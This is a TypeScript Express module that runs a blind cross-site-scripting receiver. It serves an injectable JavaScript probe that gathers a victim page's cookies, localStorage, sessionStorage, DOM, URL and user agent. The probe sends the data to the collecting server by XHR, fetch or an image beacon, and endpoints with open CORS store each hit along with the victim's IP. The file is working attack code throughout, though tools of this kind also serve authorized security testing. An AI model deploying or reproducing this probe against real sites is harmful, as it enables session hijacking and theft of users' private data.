import type { Express, Request, Response } from "express";
import { createXssHit, getXssTokenByToken } from "./db";

/**
 * Returns the JavaScript probe script that collects XSS hit data
 * and sends it back to the server.
 */
function getProbeScript(serverUrl: string, token: string): string {
  return `(function(){
  var d={};
  try{d.pageUrl=window.location.href;}catch(e){}
  try{d.originUrl=window.origin||document.domain;}catch(e){}
  try{d.referer=document.referrer;}catch(e){}
  try{d.userAgent=navigator.userAgent;}catch(e){}
  try{d.cookies=document.cookie;}catch(e){}
  try{d.dom=document.documentElement.outerHTML.substring(0,80000);}catch(e){}
  try{
    var ls={};
    for(var i=0;i<localStorage.length;i++){
      var k=localStorage.key(i);
      ls[k]=localStorage.getItem(k);
    }
    d.localStorage=JSON.stringify(ls);
  }catch(e){}
  try{
    var ss={};
    for(var i=0;i<sessionStorage.length;i++){
      var k=sessionStorage.key(i);
      ss[k]=sessionStorage.getItem(k);
    }
    d.sessionStorage=JSON.stringify(ss);
  }catch(e){}
  try{d.browserTime=new Date().toISOString();}catch(e){}
  try{d.inIframe=(window.self!==window.top);}catch(e){d.inIframe=false;}
  var ep="${serverUrl}/x/${token}/collect";
  function fallback(){
    var img=new Image();
    var params=encodeURIComponent(JSON.stringify(d));
    img.src=ep+"?d="+params;
  }
  try{
    var xhr=new XMLHttpRequest();
    xhr.open('POST',ep,true);
    xhr.setRequestHeader('Content-Type','application/json');
    xhr.send(JSON.stringify(d));
  }catch(e){
    try{
      fetch(ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),mode:'no-cors'}).catch(fallback);
    }catch(e2){fallback();}
  }
})();`;
}

export function registerXssReceiverRoutes(app: Express, serverUrl: string) {
  // Serve the probe JS file: <script src="/x/{token}"></script>
  app.get("/x/:token", async (req: Request, res: Response) => {
    const { token } = req.params;
    const tokenRecord = await getXssTokenByToken(token);
    if (!tokenRecord) {
      res.status(404).send("// Not found");
      return;
    }
    res.setHeader("Content-Type", "application/javascript");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.send(getProbeScript(serverUrl, token));
  });

  // Collect hit data via image beacon
  app.get("/x/:token/collect", async (req: Request, res: Response) => {
    const { token } = req.params;
    const tokenRecord = await getXssTokenByToken(token);

    // Always return a 1x1 transparent GIF to avoid errors
    const gif = Buffer.from(
      "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
      "base64"
    );
    res.setHeader("Content-Type", "image/gif");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.send(gif);

    if (!tokenRecord) return;

    try {
      const raw = req.query.d as string;
      let data: Record<string, any> = {};
      if (raw) {
        try {
          data = JSON.parse(decodeURIComponent(raw));
        } catch {
          data = {};
        }
      }

      const ip =
        (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
        req.socket?.remoteAddress ||
        "unknown";

      await createXssHit({
        tokenId: tokenRecord.id,
        token,
        pageUrl: data.pageUrl || null,
        originUrl: data.originUrl || null,
        referer: data.referer || req.headers.referer || null,
        userAgent: data.userAgent || req.headers["user-agent"] || null,
        ip,
        cookies: data.cookies || null,
        dom: data.dom || null,
        localStorage: data.localStorage || null,
        sessionStorage: data.sessionStorage || null,
        browserTime: data.browserTime || null,
        inIframe: data.inIframe === true,
      });

    } catch (err) {
      console.error("[XSS] Failed to record hit:", err);
    }
  });

  // Also handle POST for larger payloads
  app.post("/x/:token/collect", async (req: Request, res: Response) => {
    const { token } = req.params;
    const tokenRecord = await getXssTokenByToken(token);

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.status(200).json({ ok: true });

    if (!tokenRecord) return;

    try {
      const data = req.body || {};
      const ip =
        (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
        req.socket?.remoteAddress ||
        "unknown";

      await createXssHit({
        tokenId: tokenRecord.id,
        token,
        pageUrl: data.pageUrl || null,
        originUrl: data.originUrl || null,
        referer: data.referer || req.headers.referer || null,
        userAgent: data.userAgent || req.headers["user-agent"] || null,
        ip,
        cookies: data.cookies || null,
        dom: data.dom || null,
        localStorage: data.localStorage || null,
        sessionStorage: data.sessionStorage || null,
        browserTime: data.browserTime || null,
        inIframe: data.inIframe === true,
      });

    } catch (err) {
      console.error("[XSS] Failed to record hit:", err);
    }
  });

  // Handle CORS preflight
  app.options("/x/:token/collect", (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.status(200).end();
  });
}
